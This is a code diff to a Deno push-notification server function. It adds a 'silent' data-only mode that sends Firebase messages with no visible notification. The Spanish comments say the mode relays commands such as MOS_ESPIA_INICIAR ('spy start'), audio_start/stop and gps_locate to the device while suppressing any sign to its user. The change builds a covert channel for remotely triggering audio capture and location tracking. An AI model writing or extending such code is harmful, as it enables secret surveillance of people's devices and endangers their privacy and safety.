@@ -94,7 +94,12 @@ Deno.serve(async (req: Request) => {
     const title = String(body.title || 'MOS');
     const cuerpo = String(body.body || '');
     const data = (body.data && typeof body.data === 'object') ? body.data : null;
+    // [fix review] Mensaje SILENCIOSO (data-only): sin `notification` → el SW lo reenvía como comando
+    // (MOS_ESPIA_INICIAR, audio_start/stop, gps_locate) sin mostrar notificación visible. Réplica del
+    // `silencioso:true` del GAS. Si se pide silencioso pero no hay data, no hay nada que mandar.
+    const silencioso = body.silencioso === true || body.dataOnly === true;
     if (!tokens.length) return json({ ok: false, error: 'tokens requerido' }, 400);
+    if (silencioso && !data) return json({ ok: false, error: 'silencioso requiere data' }, 400);
 
     const projectId = Deno.env.get('FCM_PROJECT_ID');
     if (!projectId) return json({ ok: false, error: 'FCM_PROJECT_ID no configurado' }, 500);
@@ -105,12 +110,17 @@ Deno.serve(async (req: Request) => {
     let sent = 0;
     for (const token of tokens) {
       try {
-        const msg: Record<string, unknown> = {
-          token,
-          notification: { title, body: cuerpo },
-          webpush: { notification: { title, body: cuerpo, icon: ICON, badge: ICON, vibrate: [200, 100, 200] } },
-        };
-        if (data) msg.data = Object.fromEntries(Object.entries(data).map(([k, v]) => [k, String(v)]));
+        const msg: Record<string, unknown> = { token };
+        if (silencioso) {
+          // data-only: NINGÚN campo notification (ni en webpush) → no se muestra notificación; el SW lo recibe
+          // en onBackgroundMessage y lo reenvía como comando al cliente. Urgency high para que despierte rápido.
+          msg.data = Object.fromEntries(Object.entries(data!).map(([k, v]) => [k, String(v)]));
+          msg.webpush = { headers: { Urgency: 'high' } };
+        } else {
+          msg.notification = { title, body: cuerpo };
+          msg.webpush = { notification: { title, body: cuerpo, icon: ICON, badge: ICON, vibrate: [200, 100, 200] } };
+          if (data) msg.data = Object.fromEntries(Object.entries(data).map(([k, v]) => [k, String(v)]));
+        }
         const r = await fetch(url, {
           method: 'POST',
           headers: { 'Authorization': 'Bearer ' + accessToken, 'Content-Type': 'application/json' },
